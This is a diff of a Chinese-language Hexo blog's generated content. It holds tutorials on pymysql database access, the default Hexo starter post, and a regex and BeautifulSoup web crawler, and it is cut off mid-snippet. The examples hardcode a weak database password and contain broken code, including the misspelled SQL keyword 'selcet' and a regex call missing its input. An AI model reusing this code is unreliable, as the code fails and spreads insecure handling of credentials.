+    <content><![CDATA[<h3 id="1、输出为元组的形式"><a href="#1、输出为元组的形式" class="headerlink" title="1、输出为元组的形式"></a>1、输出为元组的形式</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 针对数据库的操作，一共分三步：  </span><br><span class="hljs-comment"># 1、建立数据库连接  </span><br><span class="hljs-comment"># 2、执行SQL语句  </span><br><span class="hljs-comment"># 3、关闭数据库连  </span><br>  <br><span class="hljs-comment"># Python操作数据库（如：MySQL),Python发送能够与数据库直接通信的数据包，并获取数据库服务器的啊应结果。  </span><br><span class="hljs-comment"># 是一种典型的基于TCP/IP的通信过程，要求必须要满足数据库服务器的数据包规则  </span><br>  <br><span class="hljs-keyword">import</span> pymysql  <br><span class="hljs-comment"># 建立连接  </span><br>conn = pymysql.connect(host= <span class="hljs-string">&#x27;192.168.112.188&#x27;</span>,user=<span class="hljs-string">&#x27;qiang&#x27;</span>,password=<span class="hljs-string">&#x27;123456&#x27;</span>,database=<span class="hljs-string">&#x27;learn&#x27;</span>,charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)  <br>  <br><span class="hljs-comment"># 操作数据库，先定义一个游标对象（默认输出的是元组的形式）  </span><br>cursor = conn.cursor()  <br><span class="hljs-comment"># 执行SQL语句  </span><br>sql = <span class="hljs-string">&#x27;selcet username,password,role from user where userid&lt;6&#x27;</span>  <br>cursor.execute(sql)   <span class="hljs-comment"># 注意是用游标来操作，不是用conn来操作  </span><br><span class="hljs-comment">#获取结果集  </span><br>result = cursor.fetchall()   <span class="hljs-comment">#返回的元组  </span><br><span class="hljs-built_in">print</span>(result)  <br>  <br><span class="hljs-comment"># 关闭连接  </span><br>conn.close()<br></code></pre></td></tr></table></figure>
 
-<h3 id="2、输出为列表加字典的形式"><a href="#2、输出为列表加字典的形式" class="headerlink" title="2、输出为列表加字典的形式"></a>2、输出为列表加字典的形式</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出列表加字典的形式  </span></span><br><span class="line"><span class="keyword">import</span> pymysql  </span><br><span class="line"><span class="keyword">from</span> pymysql.cursors <span class="keyword">import</span> DictCursor  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 建立连接  </span></span><br><span class="line">conn = pymysql.connect(host=<span class="string">&#x27;192.168.112.188&#x27;</span>, user=<span class="string">&#x27;qiang&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>, database=<span class="string">&#x27;learn&#x27;</span>, charset=<span class="string">&#x27;utf8&#x27;</span>,  </span><br><span class="line">                       autocommit=<span class="literal">True</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 操作数据库，先定义一个游标对象（默认输出的是元组的形式）  </span></span><br><span class="line">cursor = conn.cursor(DictCursor)  </span><br><span class="line"><span class="comment"># 执行SQL语句  </span></span><br><span class="line">sql = <span class="string">&#x27;selcet username,password,role from user where userid&lt;6&#x27;</span>  </span><br><span class="line">cursor.execute(sql)  <span class="comment"># 注意是用游标来操作，不是用conn来操作  </span></span><br><span class="line"><span class="comment"># 获取结果集  </span></span><br><span class="line">result = cursor.fetchall()  <span class="comment"># 返回的元组  </span></span><br><span class="line"><span class="built_in">print</span>(result)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 更新操作  </span></span><br><span class="line"><span class="comment"># 更新的操作，必须确认提交，两种方式：一种是设置autocommit为True,另外则是在代码中显式提交  </span></span><br><span class="line">sql1 = <span class="string">&quot;update user set password=&#x27;12345678&#x27; where userid=13&quot;</span>  </span><br><span class="line">cursor.execute(sql1)  </span><br><span class="line">conn.commit()  <span class="comment"># 显示提交更新操作 conn.rollback()回滚撤销这次操作  </span></span><br><span class="line"><span class="comment"># 关闭连接  </span></span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></div>
+<h3 id="2、输出为列表加字典的形式"><a href="#2、输出为列表加字典的形式" class="headerlink" title="2、输出为列表加字典的形式"></a>2、输出为列表加字典的形式</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 输出列表加字典的形式  </span><br><span class="hljs-keyword">import</span> pymysql  <br><span class="hljs-keyword">from</span> pymysql.cursors <span class="hljs-keyword">import</span> DictCursor  <br>  <br><span class="hljs-comment"># 建立连接  </span><br>conn = pymysql.connect(host=<span class="hljs-string">&#x27;192.168.112.188&#x27;</span>, user=<span class="hljs-string">&#x27;qiang&#x27;</span>, password=<span class="hljs-string">&#x27;123456&#x27;</span>, database=<span class="hljs-string">&#x27;learn&#x27;</span>, charset=<span class="hljs-string">&#x27;utf8&#x27;</span>,  <br>                       autocommit=<span class="hljs-literal">True</span>)  <br>  <br><span class="hljs-comment"># 操作数据库，先定义一个游标对象（默认输出的是元组的形式）  </span><br>cursor = conn.cursor(DictCursor)  <br><span class="hljs-comment"># 执行SQL语句  </span><br>sql = <span class="hljs-string">&#x27;selcet username,password,role from user where userid&lt;6&#x27;</span>  <br>cursor.execute(sql)  <span class="hljs-comment"># 注意是用游标来操作，不是用conn来操作  </span><br><span class="hljs-comment"># 获取结果集  </span><br>result = cursor.fetchall()  <span class="hljs-comment"># 返回的元组  </span><br><span class="hljs-built_in">print</span>(result)  <br>  <br><span class="hljs-comment"># 更新操作  </span><br><span class="hljs-comment"># 更新的操作，必须确认提交，两种方式：一种是设置autocommit为True,另外则是在代码中显式提交  </span><br>sql1 = <span class="hljs-string">&quot;update user set password=&#x27;12345678&#x27; where userid=13&quot;</span>  <br>cursor.execute(sql1)  <br>conn.commit()  <span class="hljs-comment"># 显示提交更新操作 conn.rollback()回滚撤销这次操作  </span><br><span class="hljs-comment"># 关闭连接  </span><br>conn.close()<br></code></pre></td></tr></table></figure>
 
-<h3 id="3、封装成函数"><a href="#3、封装成函数" class="headerlink" title="3、封装成函数"></a>3、封装成函数</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql  </span><br><span class="line"><span class="keyword">from</span> pymysql.cursors <span class="keyword">import</span> DictCursor  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_mysql</span>(<span class="params">sql</span>):  </span><br><span class="line">    conn = pymysql.connect(host=<span class="string">&#x27;192.168.112.188&#x27;</span>, user=<span class="string">&#x27;qiang&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>, database=<span class="string">&#x27;learn&#x27;</span>, charset=<span class="string">&#x27;utf8&#x27;</span>)  </span><br><span class="line">    cursor = conn.cursor(DictCursor)  </span><br><span class="line">    cursor.execute(sql)  </span><br><span class="line">    result = cursor.fetchall()  </span><br><span class="line">    conn.close()  </span><br><span class="line">    <span class="built_in">print</span>(result)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_mysql</span>(<span class="params">sql</span>):  </span><br><span class="line">    conn = pymysql.connect(host=<span class="string">&#x27;192.168.112.188&#x27;</span>, user=<span class="string">&#x27;qiang&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>, database=<span class="string">&#x27;learn&#x27;</span>, charset=<span class="string">&#x27;utf8&#x27;</span>,autocommit=<span class="literal">True</span>)  </span><br><span class="line">    cursor = conn.cursor(DictCursor)  </span><br><span class="line">    cursor.execute(sql)  </span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure></div>
+<h3 id="3、封装成函数"><a href="#3、封装成函数" class="headerlink" title="3、封装成函数"></a>3、封装成函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql  <br><span class="hljs-keyword">from</span> pymysql.cursors <span class="hljs-keyword">import</span> DictCursor  <br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_mysql</span>(<span class="hljs-params">sql</span>):  <br>    conn = pymysql.connect(host=<span class="hljs-string">&#x27;192.168.112.188&#x27;</span>, user=<span class="hljs-string">&#x27;qiang&#x27;</span>, password=<span class="hljs-string">&#x27;123456&#x27;</span>, database=<span class="hljs-string">&#x27;learn&#x27;</span>, charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)  <br>    cursor = conn.cursor(DictCursor)  <br>    cursor.execute(sql)  <br>    result = cursor.fetchall()  <br>    conn.close()  <br>    <span class="hljs-built_in">print</span>(result)  <br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_mysql</span>(<span class="hljs-params">sql</span>):  <br>    conn = pymysql.connect(host=<span class="hljs-string">&#x27;192.168.112.188&#x27;</span>, user=<span class="hljs-string">&#x27;qiang&#x27;</span>, password=<span class="hljs-string">&#x27;123456&#x27;</span>, database=<span class="hljs-string">&#x27;learn&#x27;</span>, charset=<span class="hljs-string">&#x27;utf8&#x27;</span>,autocommit=<span class="hljs-literal">True</span>)  <br>    cursor = conn.cursor(DictCursor)  <br>    cursor.execute(sql)  <br>    conn.close()<br></code></pre></td></tr></table></figure>
 
-<h3 id="4、重新定义注册函数"><a href="#4、重新定义注册函数" class="headerlink" title="4、重新定义注册函数"></a>4、重新定义注册函数</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql  </span><br><span class="line"><span class="keyword">from</span> pymysql.cursors <span class="keyword">import</span> DictCursor  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_mysql</span>(<span class="params">sql</span>):  </span><br><span class="line">    conn = pymysql.connect(host=<span class="string">&#x27;192.168.112.188&#x27;</span>, user=<span class="string">&#x27;qiang&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>, database=<span class="string">&#x27;learn&#x27;</span>, charset=<span class="string">&#x27;utf8&#x27;</span>)  </span><br><span class="line">    cursor = conn.cursor(DictCursor)  </span><br><span class="line">    cursor.execute(sql)  </span><br><span class="line">    result = cursor.fetchall()  </span><br><span class="line">    conn.close()  </span><br><span class="line">    <span class="built_in">print</span>(result)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_mysql</span>(<span class="params">sql</span>):  </span><br><span class="line">    conn = pymysql.connect(host=<span class="string">&#x27;192.168.112.188&#x27;</span>, user=<span class="string">&#x27;qiang&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>, database=<span class="string">&#x27;learn&#x27;</span>, charset=<span class="string">&#x27;utf8&#x27;</span>,autocommit=<span class="literal">True</span>)  </span><br><span class="line">    cursor = conn.cursor(DictCursor)  </span><br><span class="line">    cursor.execute(sql)  </span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure></div>
+<h3 id="4、重新定义注册函数"><a href="#4、重新定义注册函数" class="headerlink" title="4、重新定义注册函数"></a>4、重新定义注册函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql  <br><span class="hljs-keyword">from</span> pymysql.cursors <span class="hljs-keyword">import</span> DictCursor  <br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_mysql</span>(<span class="hljs-params">sql</span>):  <br>    conn = pymysql.connect(host=<span class="hljs-string">&#x27;192.168.112.188&#x27;</span>, user=<span class="hljs-string">&#x27;qiang&#x27;</span>, password=<span class="hljs-string">&#x27;123456&#x27;</span>, database=<span class="hljs-string">&#x27;learn&#x27;</span>, charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)  <br>    cursor = conn.cursor(DictCursor)  <br>    cursor.execute(sql)  <br>    result = cursor.fetchall()  <br>    conn.close()  <br>    <span class="hljs-built_in">print</span>(result)  <br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_mysql</span>(<span class="hljs-params">sql</span>):  <br>    conn = pymysql.connect(host=<span class="hljs-string">&#x27;192.168.112.188&#x27;</span>, user=<span class="hljs-string">&#x27;qiang&#x27;</span>, password=<span class="hljs-string">&#x27;123456&#x27;</span>, database=<span class="hljs-string">&#x27;learn&#x27;</span>, charset=<span class="hljs-string">&#x27;utf8&#x27;</span>,autocommit=<span class="hljs-literal">True</span>)  <br>    cursor = conn.cursor(DictCursor)  <br>    cursor.execute(sql)  <br>    conn.close()<br></code></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>python</category>
@@ -123,25 +108,25 @@
   <entry>
     <title>Hello World</title>
     <url>/2023/08/15/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
   </entry>
   <entry>
     <title>python实现基于正则表达式的爬虫</title>
     <url>/2023/09/25/python%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E7%88%AC%E8%99%AB/</url>
-    <content><![CDATA[<h2 id="一、爬虫简介"><a href="#一、爬虫简介" class="headerlink" title="一、爬虫简介"></a>一、爬虫简介</h2><p>1、搜索引擎：百度，谷歌，企业内部的知识库，某些项目专项数据爬取，专业的数据爬取<br>2、互联网：公网（不需要授权的情况就可以浏览的内容，搜索引擎的重点），深网（需要授权才能使用的内容），暗网（非正式渠道，无法使用常规手段访问)<br>3、爬取互联网的公开信息，但是正常情况下，也需要遵守一个规则：robots协议：https:&#x2F;<a class="link"   href="http://www.baidu.com/robots.txt" >www.baidu.com/robots.txt <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+    <content><![CDATA[<h2 id="一、爬虫简介"><a href="#一、爬虫简介" class="headerlink" title="一、爬虫简介"></a>一、爬虫简介</h2><p>1、搜索引擎：百度，谷歌，企业内部的知识库，某些项目专项数据爬取，专业的数据爬取<br>2、互联网：公网（不需要授权的情况就可以浏览的内容，搜索引擎的重点），深网（需要授权才能使用的内容），暗网（非正式渠道，无法使用常规手段访问)<br>3、爬取互联网的公开信息，但是正常情况下，也需要遵守一个规则：robots协议：https:&#x2F;<a href="http://www.baidu.com/robots.txt">www.baidu.com/robots.txt</a></p>
 <h2 id="二、基本原理"><a href="#二、基本原理" class="headerlink" title="二、基本原理"></a>二、基本原理</h2><p>1、所有和网页，均是HTML,HTML首先是一个大的字符串，可以按照字符串处理的方式对响应进行解析处理。其次，HTML本身也是一<br>门标记语言，与XML是同宗同源，所以可以使用DOM对其文本进行处理。<br>2、所有的爬虫，核心基于超链接，进而实现网站和网页的跳转。给我一个网站，爬遍全世界。<br>3、如果要实现一个整站爬取程序，首先需要收集到站内所有网址，并且将重复网址去除，开始爬取内容并保存在本地或数据库，进行实现后续目标。</p>
 <h2 id="三、正则表达式实现"><a href="#三、正则表达式实现" class="headerlink" title="三、正则表达式实现"></a>三、正则表达式实现</h2><table>
 <thead>
@@ -155,15 +140,15 @@
 <td>当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。</td>
 </tr>
 </tbody></table>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re,time  </span><br><span class="line">  </span><br><span class="line">resp = requests.get(<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_html</span>():  </span><br><span class="line">    <span class="comment"># 解析网页所有超链接  </span></span><br><span class="line">    links = re.findall(<span class="string">&#x27;&lt;a href=&quot;(.+?)&quot;&gt;&#x27;</span>) <span class="comment"># (.*)贪婪模式   (.+?)非贪婪模式，匹配到最近的就可以了  </span></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;articleid&#x27;</span><span class="keyword">in</span> link:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">        <span class="keyword">if</span> link.startswith(<span class="string">&#x27;#&#x27;</span>):  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">        <span class="comment">#对超链接进行处理，拼接出完整饥UL地址  </span></span><br><span class="line">        <span class="keyword">if</span> link.startswith(<span class="string">&#x27;/&#x27;</span>):  </span><br><span class="line">            link =<span class="string">&#x27;http://www.woniunote.com&#x27;</span> + link  </span><br><span class="line">        <span class="built_in">print</span>(link)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 将页面文件保存于本地  </span></span><br><span class="line">        resp = requests.get(link)  </span><br><span class="line">        resp.encoding = <span class="string">&#x27;utf-8&#x27;</span>  <span class="comment"># 注意编码问题  </span></span><br><span class="line">        filename = link.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>] + time.strftime(<span class="string">&quot;_%Y%m%d_%H%M%s&quot;</span>) + <span class="string">&#x27;.html&#x27;</span>  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;./woniunote/page/<span class="subst">&#123;filename&#125;</span>&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:  </span><br><span class="line">            file.write(resp.text)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_image</span>():  </span><br><span class="line">    resp = requests.get(<span class="string">&#x27;http://www.woniunote.com/&#x27;</span>)  </span><br><span class="line">    images = re.findall(<span class="string">&#x27;&lt;img src=&quot;(.+?)&quot;&#x27;</span>, resp.text)  </span><br><span class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> images:  </span><br><span class="line">        <span class="comment"># 处理URL地址  </span></span><br><span class="line">        <span class="keyword">if</span> image.startswith(<span class="string">&#x27;/&#x27;</span>):  </span><br><span class="line">            image = <span class="string">&#x27;http://www.woniunote.com&#x27;</span> + image  </span><br><span class="line">        <span class="comment"># 下载图片  </span></span><br><span class="line">        resp = requests.get(image)  </span><br><span class="line">        suffix = image.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]  </span><br><span class="line">        filename = time.strftime(<span class="string">&quot;%Y%m%d_%H%M%s&quot;</span>) + image.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./woniunote/image/&#x27;</span> + filename, mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:  </span><br><span class="line">            file.write(resp.content)</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests,re,time  <br>  <br>resp = requests.get(<span class="hljs-string">&#x27;&#x27;</span>)  <br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_html</span>():  <br>    <span class="hljs-comment"># 解析网页所有超链接  </span><br>    links = re.findall(<span class="hljs-string">&#x27;&lt;a href=&quot;(.+?)&quot;&gt;&#x27;</span>) <span class="hljs-comment"># (.*)贪婪模式   (.+?)非贪婪模式，匹配到最近的就可以了  </span><br>    <span class="hljs-keyword">for</span> link <span class="hljs-keyword">in</span> links:  <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;articleid&#x27;</span><span class="hljs-keyword">in</span> link:  <br>            <span class="hljs-keyword">continue</span>  <br>        <span class="hljs-keyword">if</span> link.startswith(<span class="hljs-string">&#x27;#&#x27;</span>):  <br>            <span class="hljs-keyword">continue</span>  <br>        <span class="hljs-comment">#对超链接进行处理，拼接出完整饥UL地址  </span><br>        <span class="hljs-keyword">if</span> link.startswith(<span class="hljs-string">&#x27;/&#x27;</span>):  <br>            link =<span class="hljs-string">&#x27;http://www.woniunote.com&#x27;</span> + link  <br>        <span class="hljs-built_in">print</span>(link)  <br>  <br>        <span class="hljs-comment"># 将页面文件保存于本地  </span><br>        resp = requests.get(link)  <br>        resp.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>  <span class="hljs-comment"># 注意编码问题  </span><br>        filename = link.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>] + time.strftime(<span class="hljs-string">&quot;_%Y%m%d_%H%M%s&quot;</span>) + <span class="hljs-string">&#x27;.html&#x27;</span>  <br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./woniunote/page/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, mode=<span class="hljs-string">&#x27;w&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:  <br>            file.write(resp.text)  <br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_image</span>():  <br>    resp = requests.get(<span class="hljs-string">&#x27;http://www.woniunote.com/&#x27;</span>)  <br>    images = re.findall(<span class="hljs-string">&#x27;&lt;img src=&quot;(.+?)&quot;&#x27;</span>, resp.text)  <br>    <span class="hljs-keyword">for</span> image <span class="hljs-keyword">in</span> images:  <br>        <span class="hljs-comment"># 处理URL地址  </span><br>        <span class="hljs-keyword">if</span> image.startswith(<span class="hljs-string">&#x27;/&#x27;</span>):  <br>            image = <span class="hljs-string">&#x27;http://www.woniunote.com&#x27;</span> + image  <br>        <span class="hljs-comment"># 下载图片  </span><br>        resp = requests.get(image)  <br>        suffix = image.split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>]  <br>        filename = time.strftime(<span class="hljs-string">&quot;%Y%m%d_%H%M%s&quot;</span>) + image.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]  <br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./woniunote/image/&#x27;</span> + filename, mode=<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:  <br>            file.write(resp.content)<br></code></pre></td></tr></table></figure>
 
 <h2 id="四、基于BeautifulSoup的爬虫"><a href="#四、基于BeautifulSoup的爬虫" class="headerlink" title="四、基于BeautifulSoup的爬虫"></a>四、基于BeautifulSoup的爬虫</h2><h4 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h4><ul>
 <li>Beautiful Soup提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。 Beautiful Soup自动将输入文档转换为Jnicode编码，输出文档转换为utf-8编码。你不需要考虑编码方式，除非文档没有指定一个编码方式，这时，Beautiful Soup?就不能自动识别编码方式了。然后，你仅仅需要说明一下原始编码方式就可以了。 Beautiful Soup已成为和lxml、html6lib一样出色的python解释器，为用户灵活地提供不同的解析策略或强劲的速度。</li>
 <li>BS基于DOM结构进行页面内容解析，当开始解析时，会将整个页面的DOM树保存于内存中，进而实现查找。<br>解析器：<br>(I)Python标准库BeautifulSoup(markup,”html.parser”)Python的内置标准库、执行速度适中、文档容错能力强<br>(2)Ixml HTML解析器BeautifulSoup(markup,“lxm)速度快、文档容错能力强需要安装c语言库<br>(3)Ixml XML解析器BeautifulSoup(markup,”xml”）们速度快、唯一支持XML的解析器需要安装C语言库<br>(4)html5lib   BeautifulSoup(markup,“htmlSlib)最好的容错性、以浏览器的方式解析文档、生成HTML5格式的文档速度慢、不<br>依赖外部扩展</li>
 </ul>
-<h4 id="2、代码实现"><a href="#2、代码实现" class="headerlink" title="2、代码实现"></a>2、代码实现</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup  </span><br><span class="line">  </span><br><span class="line">resp = requests.get(<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 初始化解析器  </span></span><br><span class="line">html = BeautifulSoup(resp.text, <span class="string">&#x27;lxml&#x27;</span>)  </span><br><span class="line"><span class="comment"># 查找页面元素(根据标签层次进行查找)  </span></span><br><span class="line"><span class="built_in">print</span>(html.head.title)  <span class="comment"># 根据标签的层次找页面标题  </span></span><br><span class="line"><span class="built_in">print</span>(html.head.title.string)  <span class="comment"># 获取页面标题的文本内容  </span></span><br><span class="line"><span class="built_in">print</span>(html.div)  <span class="comment"># 查找页面中的第一个DIV元素  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 查找页面元素的通用方法：  </span></span><br><span class="line"><span class="comment"># 1、find all:根据标签，属性，XPath等进行查找  </span></span><br><span class="line"><span class="comment"># 2、select:CSS选择器，div,#id,.class  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 查找页面所有超链接  </span></span><br><span class="line">links = html.find_all(<span class="string">&#x27;a&#x27;</span>)  </span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> links:  </span><br><span class="line">    <span class="built_in">print</span>(link[<span class="string">&#x27;href&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 查找页面的图片  </span></span><br><span class="line">images = html.find_all(<span class="string">&#x27;img&#x27;</span>)  </span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> images:  </span><br><span class="line">    <span class="built_in">print</span>(image[<span class="string">&#x27;src&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 根据id或class等属性查找  </span></span><br><span class="line">keyword = html.find(<span class="built_in">id</span>=<span class="string">&#x27;keyword&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(keyword[<span class="string">&#x27;placeholder&#x27;</span>])  